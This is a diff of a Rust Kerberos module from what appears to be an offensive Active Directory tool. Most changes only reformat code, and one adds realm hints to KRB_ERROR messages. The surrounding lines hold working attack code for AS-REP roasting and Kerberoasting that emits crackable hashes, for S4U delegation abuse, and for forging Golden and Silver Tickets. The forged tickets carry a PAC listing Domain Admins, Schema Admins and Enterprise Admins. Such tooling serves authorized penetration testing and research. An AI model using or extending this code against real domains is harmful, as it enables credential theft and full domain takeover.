@@ -7,10 +7,9 @@ use crate::error::{OverthroneError, Result};
 use crate::proto::ntlm;
 use chrono::Utc;
 use kerberos_asn1::{
-    ApReq, AsRep, AsReq, Asn1Object, Authenticator as KrbAuthenticator, Checksum,
-    EncAsRepPart, EncTgsRepPart, EncryptedData, KdcReqBody, KerbPaPacRequest,
-    KerberosFlags, KerberosTime, KrbError, PaData, PaEncTsEnc, PaForUser,
-    PrincipalName, TgsRep, TgsReq, Ticket,
+    ApReq, AsRep, AsReq, Asn1Object, Authenticator as KrbAuthenticator, Checksum, EncAsRepPart,
+    EncTgsRepPart, EncryptedData, KdcReqBody, KerbPaPacRequest, KerberosFlags, KerberosTime,
+    KrbError, PaData, PaEncTsEnc, PaForUser, PrincipalName, TgsRep, TgsReq, Ticket,
 };
 use kerberos_crypto::new_kerberos_cipher;
 use std::net::SocketAddr;
@@ -336,10 +335,33 @@ fn parse_krb_error(data: &[u8]) -> OverthroneError {
     match KrbError::parse(data) {
         Ok((_, krb_err)) => {
             let code = krb_err.error_code;
-            OverthroneError::Kerberos(format!(
-                "KRB_ERROR {code}: {}",
-                krb_error_to_string(code)
-            ))
+            let base_msg = format!("KRB_ERROR {code}: {}", krb_error_to_string(code));
+
+            // For WRONG_REALM, extract realm hints from the KRB-ERROR response
+            if code == 68 {
+                // KDC_ERR_WRONG_REALM — the KDC often includes the correct realm
+                let suggested_realm =
+                    krb_err.crealm.as_ref().map(|r| r.to_string()).or_else(|| {
+                        // Fall back to the service realm from the error
+                        let r = krb_err.realm.to_string();
+                        if !r.is_empty() { Some(r) } else { None }
+                    });
+
+                return if let Some(ref realm) = suggested_realm {
+                    OverthroneError::Kerberos(format!(
+                        "{base_msg}. Did you mean '{realm}'? Try: --domain {realm}\n\
+                         Hint: verify realm with: nslookup -type=SRV _ldap._tcp.dc._msdcs.{realm}",
+                        realm = realm
+                    ))
+                } else {
+                    OverthroneError::Kerberos(format!(
+                        "{base_msg}. The specified realm/domain is incorrect.\n\
+                         Hint: verify realm with: nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>"
+                    ))
+                };
+            }
+
+            OverthroneError::Kerberos(base_msg)
         }
         Err(_) => OverthroneError::Kerberos("Failed to parse KDC response".to_string()),
     }
@@ -351,11 +373,7 @@ fn parse_krb_error(data: &[u8]) -> OverthroneError {
 
 /// Perform AS-REP Roasting against a user with DONT_REQ_PREAUTH.
 /// Returns a hashcat-mode-18200 compatible hash string.
-pub async fn asrep_roast(
-    dc_ip: &str,
-    domain: &str,
-    username: &str,
-) -> Result<CrackableHash> {
+pub async fn asrep_roast(dc_ip: &str, domain: &str, username: &str) -> Result<CrackableHash> {
     let realm = normalize_realm(domain);
     let clean_username = normalize_username(username);
     info!("AS-REP Roasting: {clean_username}@{realm} via {dc_ip}");
@@ -432,9 +450,8 @@ pub async fn request_tgt(
 
     let response_bytes = kdc_exchange(dc_ip, &as_req.build()).await?;
 
-    let (_, as_rep) = AsRep::parse(&response_bytes).map_err(|_| {
-        parse_krb_error(&response_bytes)
-    })?;
+    let (_, as_rep) =
+        AsRep::parse(&response_bytes).map_err(|_| parse_krb_error(&response_bytes))?;
 
     // Decrypt enc-part to extract session key
     let cipher = new_kerberos_cipher(etype)
@@ -516,9 +533,8 @@ pub async fn kerberoast(
 
     let response_bytes = kdc_exchange(dc_ip, &tgs_req.build()).await?;
 
-    let (_, tgs_rep) = TgsRep::parse(&response_bytes).map_err(|_| {
-        parse_krb_error(&response_bytes)
-    })?;
+    let (_, tgs_rep) =
+        TgsRep::parse(&response_bytes).map_err(|_| parse_krb_error(&response_bytes))?;
 
     // Extract encrypted part of the SERVICE TICKET for offline cracking
     let enc_part = &tgs_rep.ticket.enc_part;
@@ -539,7 +555,10 @@ pub async fn kerberoast(
         ),
     };
 
-    info!("Kerberoast hash for {target_spn} (etype: {})", enc_part.etype);
+    info!(
+        "Kerberoast hash for {target_spn} (etype: {})",
+        enc_part.etype
+    );
     Ok(CrackableHash {
         username: tgt.client_principal.clone(),
         domain: realm.to_string(),
@@ -589,7 +608,12 @@ pub async fn request_service_ticket(
     let req_body = build_tgs_req_body(
         realm,
         sname,
-        &[tgt.session_key_etype, ETYPE_RC4_HMAC, ETYPE_AES256_CTS, ETYPE_AES128_CTS],
+        &[
+            tgt.session_key_etype,
+            ETYPE_RC4_HMAC,
+            ETYPE_AES256_CTS,
+            ETYPE_AES128_CTS,
+        ],
         KDC_OPT_FORWARDABLE | KDC_OPT_RENEWABLE | KDC_OPT_CANONICALIZE,
         None,
         None,
@@ -606,9 +630,8 @@ pub async fn request_service_ticket(
     let response_bytes = kdc_exchange(dc_ip, &tgs_req.build()).await?;
 
     // Parse TGS-REP
-    let (_, tgs_rep) = TgsRep::parse(&response_bytes).map_err(|_| {
-        parse_krb_error(&response_bytes)
-    })?;
+    let (_, tgs_rep) =
+        TgsRep::parse(&response_bytes).map_err(|_| parse_krb_error(&response_bytes))?;
 
     // Decrypt enc-part with TGT session key (key usage 8 for TGS-REP)
     let cipher = new_kerberos_cipher(tgt.session_key_etype)
@@ -705,9 +728,8 @@ pub async fn s4u2self(
 
     let response_bytes = kdc_exchange(dc_ip, &tgs_req.build()).await?;
 
-    let (_, tgs_rep) = TgsRep::parse(&response_bytes).map_err(|_| {
-        parse_krb_error(&response_bytes)
-    })?;
+    let (_, tgs_rep) =
+        TgsRep::parse(&response_bytes).map_err(|_| parse_krb_error(&response_bytes))?;
 
     let cipher = new_kerberos_cipher(tgt.session_key_etype)
         .map_err(|e| OverthroneError::Kerberos(format!("Cipher: {e}")))?;
@@ -742,7 +764,10 @@ pub async fn s4u2proxy(
     target_spn: &str,
 ) -> Result<TicketGrantingData> {
     let realm = &tgt.client_realm;
-    info!("S4U2Proxy: {target_spn} as {}", s4u2self_ticket.client_principal);
+    info!(
+        "S4U2Proxy: {target_spn} as {}",
+        s4u2self_ticket.client_principal
+    );
 
     let spn_parts: Vec<&str> = target_spn.splitn(2, '/').collect();
     let sname = PrincipalName {
@@ -782,9 +807,8 @@ pub async fn s4u2proxy(
 
     let response_bytes = kdc_exchange(dc_ip, &tgs_req.build()).await?;
 
-    let (_, tgs_rep) = TgsRep::parse(&response_bytes).map_err(|_| {
-        parse_krb_error(&response_bytes)
-    })?;
+    let (_, tgs_rep) =
+        TgsRep::parse(&response_bytes).map_err(|_| parse_krb_error(&response_bytes))?;
 
     let cipher = new_kerberos_cipher(tgt.session_key_etype)
         .map_err(|e| OverthroneError::Kerberos(format!("Cipher: {e}")))?;
@@ -812,11 +836,7 @@ pub async fn s4u2proxy(
 // ═══════════════════════════════════════════════════════════
 
 /// Build HMAC-MD5 checksum for S4U2Self PA-FOR-USER
-fn build_s4u2self_checksum(
-    username: &str,
-    realm: &str,
-    session_key: &[u8],
-) -> Checksum {
+fn build_s4u2self_checksum(username: &str, realm: &str, session_key: &[u8]) -> Checksum {
     use hmac::{Hmac, Mac};
 
     let mut data: Vec<u8> = Vec::new();
@@ -825,8 +845,7 @@ fn build_s4u2self_checksum(
     data.extend_from_slice(realm.as_bytes());
     data.extend_from_slice(b"Kerberos");
 
-    let mut mac =
-        Hmac::<md5::Md5>::new_from_slice(session_key).expect("HMAC-MD5 accepts any key");
+    let mut mac = Hmac::<md5::Md5>::new_from_slice(session_key).expect("HMAC-MD5 accepts any key");
     mac.update(&data);
     let result = mac.finalize().into_bytes();
 
@@ -932,7 +951,9 @@ pub fn forge_tgt(
 
     info!(
         "Golden Ticket forged: {} @ {} ({} bytes)",
-        username, realm, ticket.build().len()
+        username,
+        realm,
+        ticket.build().len()
     );
 
     Ok(TicketGrantingData {
@@ -944,7 +965,6 @@ pub fn forge_tgt(
         end_time: Some(KerberosTime::from(endtime)),
     })
 }
-
 
 /// Forge a service ticket (Silver Ticket) using the service account's NTLM hash.
 ///
@@ -1017,7 +1037,9 @@ pub fn forge_service_ticket(
 
     info!(
         "Silver Ticket forged: {} → {} ({} bytes)",
-        username, spn, ticket.build().len()
+        username,
+        spn,
+        ticket.build().len()
     );
 
     Ok(TicketGrantingData {
@@ -1029,7 +1051,6 @@ pub fn forge_service_ticket(
         end_time: Some(KerberosTime::from(endtime)),
     })
 }
-
 
 // ═══════════════════════════════════════════════════════════
 // Ticket Forging Internals
@@ -1049,7 +1070,6 @@ fn generate_session_key(etype: i32) -> Vec<u8> {
     }
     key
 }
-
 
 /// Build EncTicketPart as raw DER bytes (ASN.1 manual construction)
 ///
@@ -1143,18 +1163,12 @@ fn build_enc_ticket_part(
     asn1_application_tag(3, &seq)
 }
 
-
 /// Build a minimal PAC (Privilege Attribute Certificate)
 ///
 /// The PAC contains KERB_VALIDATION_INFO (NDR-encoded) which tells the
 /// target service what groups the user belongs to. For a golden ticket,
 /// we add Domain Admins (512), Enterprise Admins (519), etc.
-fn build_minimal_pac(
-    domain_sid: &str,
-    username: &str,
-    user_rid: u32,
-    realm: &str,
-) -> Vec<u8> {
+fn build_minimal_pac(domain_sid: &str, username: &str, user_rid: u32, realm: &str) -> Vec<u8> {
     // PAC structure:
     //   PACTYPE header: cBuffers(u32), Version(u32)
     //   PAC_INFO_BUFFER[]: ulType(u32), cbBufferSize(u32), Offset(u64)
@@ -1175,11 +1189,11 @@ fn build_minimal_pac(
 
     let mut pac = Vec::new();
     // PACTYPE header
-    pac.extend_from_slice(&1u32.to_le_bytes());  // cBuffers = 1
-    pac.extend_from_slice(&0u32.to_le_bytes());  // Version = 0
+    pac.extend_from_slice(&1u32.to_le_bytes()); // cBuffers = 1
+    pac.extend_from_slice(&0u32.to_le_bytes()); // Version = 0
 
     // PAC_INFO_BUFFER for LOGON_INFORMATION
-    pac.extend_from_slice(&1u32.to_le_bytes());  // ulType = 1 (LOGON_INFORMATION)
+    pac.extend_from_slice(&1u32.to_le_bytes()); // ulType = 1 (LOGON_INFORMATION)
     pac.extend_from_slice(&(logon_padded.len() as u32).to_le_bytes()); // cbBufferSize
     pac.extend_from_slice(&logon_offset.to_le_bytes()); // Offset
 
@@ -1188,7 +1202,6 @@ fn build_minimal_pac(
 
     pac
 }
-
 
 /// Build KERB_VALIDATION_INFO (NDR-encoded) for the PAC
 ///
@@ -1223,20 +1236,21 @@ fn build_kerb_validation_info(
     // LogonTime (FILETIME) — current time as Windows FILETIME
     let filetime = chrono_to_filetime(&Utc::now());
     buf.extend_from_slice(&filetime.to_le_bytes()); // LogonTime
-    buf.extend_from_slice(&0u64.to_le_bytes());     // LogoffTime (never)
-    buf.extend_from_slice(&0u64.to_le_bytes());     // KickOffTime (never)
+    buf.extend_from_slice(&0u64.to_le_bytes()); // LogoffTime (never)
+    buf.extend_from_slice(&0u64.to_le_bytes()); // KickOffTime (never)
     buf.extend_from_slice(&filetime.to_le_bytes()); // PasswordLastSet
-    buf.extend_from_slice(&0u64.to_le_bytes());     // PasswordCanChange
+    buf.extend_from_slice(&0u64.to_le_bytes()); // PasswordCanChange
     buf.extend_from_slice(&0x7FFFFFFFFFFFFFFFu64.to_le_bytes()); // PasswordMustChange (never)
 
     // EffectiveName (RPC_UNICODE_STRING) — pointer, will be deferred
-    let username_utf16: Vec<u8> = username.encode_utf16()
+    let username_utf16: Vec<u8> = username
+        .encode_utf16()
         .flat_map(|c| c.to_le_bytes())
         .collect();
     let username_byte_len = username_utf16.len() as u16;
     buf.extend_from_slice(&username_byte_len.to_le_bytes()); // Length
     buf.extend_from_slice(&username_byte_len.to_le_bytes()); // MaximumLength
-    buf.extend_from_slice(&0x00040000u32.to_le_bytes());      // Pointer (deferred)
+    buf.extend_from_slice(&0x00040000u32.to_le_bytes()); // Pointer (deferred)
 
     // FullName (RPC_UNICODE_STRING) — same as username for simplicity
     buf.extend_from_slice(&username_byte_len.to_le_bytes());
@@ -1265,18 +1279,18 @@ fn build_kerb_validation_info(
 
     // LogonCount, BadPasswordCount
     buf.extend_from_slice(&100u16.to_le_bytes()); // LogonCount
-    buf.extend_from_slice(&0u16.to_le_bytes());   // BadPasswordCount
+    buf.extend_from_slice(&0u16.to_le_bytes()); // BadPasswordCount
 
     // UserId, PrimaryGroupId
-    buf.extend_from_slice(&user_rid.to_le_bytes());    // UserId (500 for Admin)
-    buf.extend_from_slice(&513u32.to_le_bytes());      // PrimaryGroupId (Domain Users)
+    buf.extend_from_slice(&user_rid.to_le_bytes()); // UserId (500 for Admin)
+    buf.extend_from_slice(&513u32.to_le_bytes()); // PrimaryGroupId (Domain Users)
 
     // GroupCount + GroupIds pointer
     // Groups: Domain Admins(512), Domain Users(513), Schema Admins(518),
     //         Enterprise Admins(519), Group Policy Creator(520)
     let group_rids: Vec<u32> = vec![512, 513, 518, 519, 520];
     buf.extend_from_slice(&(group_rids.len() as u32).to_le_bytes()); // GroupCount
-    buf.extend_from_slice(&0x000C0000u32.to_le_bytes());             // GroupIds pointer
+    buf.extend_from_slice(&0x000C0000u32.to_le_bytes()); // GroupIds pointer
 
     // UserFlags
     buf.extend_from_slice(&0x20u32.to_le_bytes()); // LOGON_EXTRA_SIDS
@@ -1286,7 +1300,10 @@ fn build_kerb_validation_info(
 
     // LogonServer (RPC_UNICODE_STRING)
     let server = "DC01".to_string();
-    let server_utf16: Vec<u8> = server.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
+    let server_utf16: Vec<u8> = server
+        .encode_utf16()
+        .flat_map(|c| c.to_le_bytes())
+        .collect();
     let server_byte_len = server_utf16.len() as u16;
     buf.extend_from_slice(&server_byte_len.to_le_bytes());
     buf.extend_from_slice(&server_byte_len.to_le_bytes());
@@ -1318,8 +1335,8 @@ fn build_kerb_validation_info(
     buf.extend_from_slice(&[0u8; 8]);
 
     // SidCount + ExtraSids pointer
-    buf.extend_from_slice(&0u32.to_le_bytes());  // SidCount = 0
-    buf.extend_from_slice(&0u32.to_le_bytes());  // ExtraSids = NULL
+    buf.extend_from_slice(&0u32.to_le_bytes()); // SidCount = 0
+    buf.extend_from_slice(&0u32.to_le_bytes()); // ExtraSids = NULL
 
     // ResourceGroupDomainSid (NULL), ResourceGroupCount, ResourceGroupIds (NULL)
     buf.extend_from_slice(&0u32.to_le_bytes());
@@ -1339,7 +1356,7 @@ fn build_kerb_validation_info(
     // GroupIds array (GROUP_MEMBERSHIP: RelativeId u32, Attributes u32)
     buf.extend_from_slice(&(group_rids.len() as u32).to_le_bytes()); // MaxCount
     for rid in &group_rids {
-        buf.extend_from_slice(&rid.to_le_bytes());          // RelativeId
+        buf.extend_from_slice(&rid.to_le_bytes()); // RelativeId
         buf.extend_from_slice(&0x00000007u32.to_le_bytes()); // Attributes: SE_GROUP_*
     }
 
@@ -1366,12 +1383,11 @@ fn build_kerb_validation_info(
     buf
 }
 
-
 /// Write an NDR conformant varying string (MaxCount, Offset, ActualCount, data)
 fn ndr_write_conformant_string(buf: &mut Vec<u8>, utf16_bytes: &[u8]) {
     let char_count = (utf16_bytes.len() / 2) as u32;
     buf.extend_from_slice(&char_count.to_le_bytes()); // MaxCount
-    buf.extend_from_slice(&0u32.to_le_bytes());        // Offset
+    buf.extend_from_slice(&0u32.to_le_bytes()); // Offset
     buf.extend_from_slice(&char_count.to_le_bytes()); // ActualCount
     buf.extend_from_slice(utf16_bytes);
     // Pad to 4-byte boundary
@@ -1380,27 +1396,20 @@ fn ndr_write_conformant_string(buf: &mut Vec<u8>, utf16_bytes: &[u8]) {
     }
 }
 
-
 /// Parse a SID string ("S-1-5-21-...") into binary format
 fn parse_sid_to_bytes(sid_str: &str) -> Vec<u8> {
     let parts: Vec<&str> = sid_str.split('-').collect();
     if parts.len() < 4 || parts[0] != "S" {
         // Return a dummy SID
         return vec![
-            0x01, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05,
-            0x15, 0x00, 0x00, 0x00,
-            0x00, 0x00, 0x00, 0x00,
-            0x00, 0x00, 0x00, 0x00,
-            0x00, 0x00, 0x00, 0x00,
+            0x01, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x15, 0x00, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
         ];
     }
 
     let revision: u8 = parts[1].parse().unwrap_or(1);
     let authority: u64 = parts[2].parse().unwrap_or(5);
-    let sub_authorities: Vec<u32> = parts[3..]
-        .iter()
-        .filter_map(|s| s.parse().ok())
-        .collect();
+    let sub_authorities: Vec<u32> = parts[3..].iter().filter_map(|s| s.parse().ok()).collect();
 
     let mut sid = Vec::new();
     sid.push(revision);
@@ -1414,16 +1423,13 @@ fn parse_sid_to_bytes(sid_str: &str) -> Vec<u8> {
     sid
 }
 
-
 /// Convert chrono DateTime to Windows FILETIME (100-nanosecond intervals since 1601-01-01)
 fn chrono_to_filetime(dt: &chrono::DateTime<Utc>) -> u64 {
     // Offset between 1601-01-01 and 1970-01-01 in 100ns intervals
     const EPOCH_DIFF: u64 = 116_444_736_000_000_000;
-    let unix_100ns = dt.timestamp() as u64 * 10_000_000
-        + dt.timestamp_subsec_nanos() as u64 / 100;
+    let unix_100ns = dt.timestamp() as u64 * 10_000_000 + dt.timestamp_subsec_nanos() as u64 / 100;
     unix_100ns + EPOCH_DIFF
 }
-
 
 // ═══════════════════════════════════════════════════════════
 // ASN.1 DER Encoding Helpers (for manual EncTicketPart construction)
@@ -1438,7 +1444,12 @@ fn asn1_length(len: usize) -> Vec<u8> {
     } else if len < 0x10000 {
         vec![0x82, (len >> 8) as u8, (len & 0xFF) as u8]
     } else {
-        vec![0x83, (len >> 16) as u8, (len >> 8 & 0xFF) as u8, (len & 0xFF) as u8]
+        vec![
+            0x83,
+            (len >> 16) as u8,
+            (len >> 8 & 0xFF) as u8,
+            (len & 0xFF) as u8,
+        ]
     }
 }
 
@@ -1488,8 +1499,14 @@ fn asn1_integer(val: i64) -> Vec<u8> {
         out.push(val as u8);
     } else if (0..0x8000).contains(&val) {
         if val < 0x100 {
-            if val >= 0x80 { out.push(2); out.push(0); out.push(val as u8); }
-            else { out.push(1); out.push(val as u8); }
+            if val >= 0x80 {
+                out.push(2);
+                out.push(0);
+                out.push(val as u8);
+            } else {
+                out.push(1);
+                out.push(val as u8);
+            }
         } else {
             out.push(2);
             out.push((val >> 8) as u8);
@@ -1523,8 +1540,8 @@ fn asn1_octet_string(data: &[u8]) -> Vec<u8> {
 /// ASN.1 BIT STRING from u32 flags (Kerberos TicketFlags)
 fn asn1_bitstring_u32(flags: u32) -> Vec<u8> {
     let mut out = vec![0x03]; // BIT STRING tag
-    out.push(5);              // length: 1 byte unused bits + 4 bytes data
-    out.push(0);              // 0 unused bits
+    out.push(5); // length: 1 byte unused bits + 4 bytes data
+    out.push(0); // 0 unused bits
     out.extend_from_slice(&flags.to_be_bytes());
     out
 }
@@ -1556,7 +1573,6 @@ fn asn1_sequence_of_general_strings(strings: &[&str]) -> Vec<u8> {
 fn format_kerberos_time(dt: &chrono::DateTime<Utc>) -> String {
     dt.format("%Y%m%d%H%M%SZ").to_string()
 }
-
 
 /// Hex encode bytes to lowercase hex string
 fn hex_encode(data: &[u8]) -> String {
